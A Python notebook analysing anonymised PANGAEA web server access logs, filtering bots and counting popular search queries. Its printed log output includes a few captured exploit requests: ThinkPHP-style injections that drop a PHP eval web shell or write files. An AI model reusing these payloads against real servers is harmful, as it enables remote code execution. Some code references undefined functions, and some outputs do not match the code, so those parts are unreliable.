# %%
import pandas as pd
import re
from datetime import datetime
import pytz
from urllib.parse import unquote

# %%
parse_datetime('13/Nov/2015:11:45:42 +0000')
# Out:
# datetime.datetime(2015, 11, 3, 11, 45, 4, tzinfo=<UTC>)

# %%
import os
current_file = os.getcwd()
myfile = os.path.join(current_file, 'www.pangaea.de-access-anon.log.bz2')

# %%
#ref: https://mmas.github.io/read-apache-access-log-pandas
logData = pd.read_csv(myfile,
    sep=r'\s(?=(?:[^"]*"[^"]*")*[^"]*$)(?![^\[]*\])',
    engine='python',
    na_values='-',
    header=None,
    usecols=[0, 3, 4, 5, 7, 8],encoding="utf-8",
    names=['ip', 'time', 'request', 'status', 'referer', 'user_agent'])

# %%
logData.head(1)
# Out:
#                                  ip                          time  \
# 0  68aa873d61a6586244b0892d7bca2573  [30/Sep/2019:06:25:44 +0000]
#
#                                              request  status referer  \
# 0  "GET /search?ie=UTF-8&q=parameter%3A%22Bathysi...   301.0     "-"
#
#                                           user_agent
# 0  "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http...

# %%
logData['status'] = logData['status'].fillna(0) #convert non-finite values (NA or inf) to integer
logData['status'] = logData['status'].astype(int)
logData.head(1)
# Out:
#                                  ip                          time  \
# 0  68aa873d61a6586244b0892d7bca2573  [30/Sep/2019:06:25:44 +0000]
#
#                                              request  status referer  \
# 0  "GET /search?ie=UTF-8&q=parameter%3A%22Bathysi...     301     "-"
#
#                                           user_agent
# 0  "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http...

# %%
logData['request']= logData['request'].apply(lambda x: re.sub(r'^"|"$', '', str(x)) )
logData['user_agent']= logData['user_agent'].apply(lambda x: re.sub(r'^"|"$', '',str(x)) )
logData['referer']= logData['referer'].apply(lambda x: re.sub(r'^"|"$', '',str(x)) )

# %%
logData.shape
# Out:
# (3874088, 6)

# %%
logData['request_type'] = logData['request'].str.split().str[0]
logData['resource'] = logData['request'].str.split().str[1]
logData.head(1)
# Out:
#                                  ip                          time  \
# 0  68aa873d61a6586244b0892d7bca2573  [30/Sep/2019:06:25:44 +0000]
#
#                                              request  status referer  \
# 0  GET /search?ie=UTF-8&q=parameter%3A%22Bathysip...     301       -
#
#                                           user_agent request_type  \
# 0  Mozilla/5.0 (compatible; AhrefsBot/6.1; +http:...          GET
#
#                                             resource
# 0  /search?ie=UTF-8&q=parameter%3A%22Bathysiphon+...

# %%
logData = logData[(logData.request_type == 'GET') & (logData.status == 200)]
logData.shape
# Out:
# (3063078, 8)

# %%
logData=logData.drop('request', axis=1)
logData.head(1)
# Out:
#                                  ip                          time  status  \
# 3  75892c86ec3272b7fa79e0f2c375a9f5  [30/Sep/2019:06:25:56 +0000]     200
#
#   referer                                         user_agent request_type  \
# 3       -  Mozilla/5.0 (compatible; SemrushBot/6~bl; +htt...          GET
#
#                                             resource
# 3  /?maxdate=2005-12-31T23%3A59%3A59&mindate=2005...

# %%
logData = logData[~logData['resource'].str.match(
    r'^/media|^/static|^/admin|^/robots.txt$|^/favicon.ico$')]
logData = logData[~logData['user_agent'].str.match(
    r'.*?bot|.*?spider|.*?crawler|.*?slurp', flags=re.I).fillna(False)]
logData.shape
# Out:
# (1858386, 7)

# %%
logData.head(2)
# Out:
#                                   ip                          time  status  \
# 9   eb6f30241bf7ff9bf1c6ddb6d5ea2d66  [30/Sep/2019:06:26:12 +0000]     200
# 20  b66d6bd12d4aadc04d896d2d086e7572  [30/Sep/2019:06:26:42 +0000]     200
#
#                                           referer  \
# 9   https://doi.pangaea.de/10.1594/PANGAEA.890974
# 20         https://wiki.pangaea.de/wiki/Main_Page
#
#                                            user_agent request_type  \
# 9   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6...          GET
# 20  Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53...          GET
#
#                                   resource
# 9                              /?q=SOCATv5
# 20  /assets/layout-images/pangaea-logo.png

# %%
#https://doi.pangaea.de, https://www.pangaea.de
#use referrel to filter out external requests - only request originated from the portal will be considered
logData = logData[logData.referer.str.startswith('https://doi.pangaea.de') | logData.referer.str.startswith('https://www.pangaea.de')]
logData.shape
# Out:
# (1335062, 7)

# %%
#exclude queries originated from external search -> /advanced/search.php, /advanced/warehouse.php
logData = logData[~logData.resource.str.startswith('/advanced/')]
logData.shape
# Out:
# (1234130, 8)

# %%
logData.head(5)
# Out:
#                                   ip                          time  status  \
# 9   eb6f30241bf7ff9bf1c6ddb6d5ea2d66  [30/Sep/2019:06:26:12 +0000]     200
# 69  f7e9caa0b677920355cc01f122454d80  [30/Sep/2019:06:28:49 +0000]     200
# 84  21346f2062c9244571b00c87599e8a71  [30/Sep/2019:06:29:45 +0000]     200
# 85  21346f2062c9244571b00c87599e8a71  [30/Sep/2019:06:29:45 +0000]     200
# 93  c55f188273605a153e5cd0985f1c56c2  [30/Sep/2019:06:30:16 +0000]     200
#
#                                           referer  \
# 9   https://doi.pangaea.de/10.1594/PANGAEA.890974
# 69  https://doi.pangaea.de/10.1594/PANGAEA.856679
# 84  https://doi.pangaea.de/10.1594/PANGAEA.906113
# 85  https://doi.pangaea.de/10.1594/PANGAEA.906113
# 93  https://doi.pangaea.de/10.1594/PANGAEA.744675
#
#                                            user_agent request_type  \
# 9   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6...          GET
# 69  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...          GET
# 84  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:6...          GET
# 85  Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:6...          GET
# 93  Mozilla/5.0 (Windows NT 6.1; Win64; x64) Apple...          GET
#
#                                              resource  \
# 9                                         /?q=SOCATv5
# 69          /shared/pics/licenses/CC-BY-NC-SA-3.0.png
# 84  /assets/v.49ad7ed928027a3f2ade180129c6f614/boo...
# 85  /assets/v.49ad7ed928027a3f2ade180129c6f614/css...
# 93  /assets/v.49ad7ed928027a3f2ade180129c6f614/boo...
#
#                                                 title
# 9                                         /?q=SOCATv5
# 69          /shared/pics/licenses/CC-BY-NC-SA-3.0.png
# 84  /assets/v.49ad7ed928027a3f2ade180129c6f614/boo...
# 85  /assets/v.49ad7ed928027a3f2ade180129c6f614/css...
# 93  /assets/v.49ad7ed928027a3f2ade180129c6f614/boo...

# %%
regex = '(\?q\=)(.*?)\&'
def parse_query(url):
    parsed = urlparse.urlparse(url)
    l = None
    if 'q' in parse_qs(parsed.query):
        l = parse_qs(parsed.query)['q']
        l= l[0].lower()
    else:
        search = re.search(regex, url, re.IGNORECASE)
        if search:
            l= search.group(2).lower()
    return l

# %%
searchData =logData.copy()
logData.shape
# Out:
# (1234130, 8)

# %%
searchData= searchData[searchData.resource.str.contains('q=')]
searchData.shape
# Out:
# (6091, 8)

# %%
keyWords = searchData['resource'].apply(parse_query)

# %%
top50KeyWords = keyWords.value_counts().head(50)

# %%
df = pd.DataFrame({'word':top50KeyWords.index, 'count':top50KeyWords.values})
df.head(20)
# Out:
#                                                  word  count
# 0                            parameter:"file content"    116
# 1                     parameter:"carbon dioxide flux"     98
# 2                               parameter:"file name"     89
# 3   parameter:"uniform resource locator/link to file"     70
# 4                                              melles     52
# 5                               parameter:"file size"     46
# 6                    parameter:"depth, sediment/rock"     45
# 7                                     parameter:"age"     37
# 8                             parameter:"event label"     36
# 9                               parameter:"date/time"     32
# 10                            parameter:"file format"     32
# 11                           parameter:"methane flux"     30
# 12                      parameter:"temperature, soil"     29
# 13                               vos finnpartner 2005     28
# 14                                     δ18o age model     28
# 15                                method:"calculated"     25
# 16                     biometric measurements of fish     25
# 17  parameter:"uniform resource locator/link to ra...     22
# 18                                           odp 1202     20
# 19                               parameter:"salinity"     20

# %%
#remove 'parameter:' from the word column
#df['word'] = df['word'].str.replace('parameter:', '')
df.head(50)
# Out:
#                                                  word  count
# 0                                      "file content"    116
# 1                               "carbon dioxide flux"     98
# 2                                         "file name"     89
# 3             "uniform resource locator/link to file"     70
# 4                                              melles     52
# 5                                         "file size"     46
# 6                              "depth, sediment/rock"     45
# 7                                               "age"     37
# 8                                       "event label"     36
# 9                                         "date/time"     32
# 10                                      "file format"     32
# 11                                     "methane flux"     30
# 12                                "temperature, soil"     29
# 13                               vos finnpartner 2005     28
# 14                                     δ18o age model     28
# 15                                method:"calculated"     25
# 16                     biometric measurements of fish     25
# 17   "uniform resource locator/link to raw data file"     22
# 18                                           odp 1202     20
# 19                                         "salinity"     20
# 20                              rv sonne cruise so236     19
# 21                                        "age model"     19
# 22                            tisler reef, skagerrak      18
# 23  "uniform resource locator/link to raw data fil...     18
# 24                                          md95-2042     18
# 25           "short-wave downward (global) radiation"     18
# 26                                                "-"     15
# 27                                "calcium carbonate"     15
# 28  pi:"internationale gewässerschutzkommission fü...     15
# 29             "sea surface temperature, annual mean"     15
# 30                        western channel observatory     14
# 31                                               "ph"     13
# 32                          ark-xxiv/1 -psradiosingle     13
# 33                                   "carbon dioxide"     13
# 34                                         sst v30-40     13
# 35                         method:"pyranometer, kipp      12
# 36                                 paleomagnetic data     12
# 37                                "sample code/label"     12
# 38                                         bathymetry     12
# 39                                           kuroshio     12
# 40                    "river discharge, monthly mean"     12
# 41                                                sst     12
# 42                      "extraterrestrial insolation"     11
# 43                 "river discharge, monthly minimum"     11
# 44                                  de vittor, cinzia     11
# 45                       keyword:"danube delta coast"     11
# 46                 "river discharge, monthly maximum"     11
# 47                             keyword:"danube delta"     11
# 48                          event:label:ceatal-izmail     11
# 49                                          @ref23662     11

# %%
temp = logData[logData.resource.str.contains('content')]
print(temp.shape)
for index, row in temp.iterrows():
    print(row['resource'])
# Out:
# (125, 8)
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /shared/help/toolbar/content1.gif
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /shared/help/toolbar/content1.gif
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php @eval($_POST[hm]);?>hmseo')</php>
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"Carbon+content+per+individual"
# /?q=parameter:"Carbon+content+per+individual"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.txt&vars[1][]=<title>�ٶ�һ�£����֪�� </title>
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('hmseo.php','<?php @eval($_POST[hm]);?>hmseo')</php>
# /?q=parameter:"File+content"
# /?q=parameter:"Nitrogen+content+per+dry+mass"
# /?q=parameter:"Nitrogen+content+per+dry+mass"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
# /?q=parameter:"File+content"
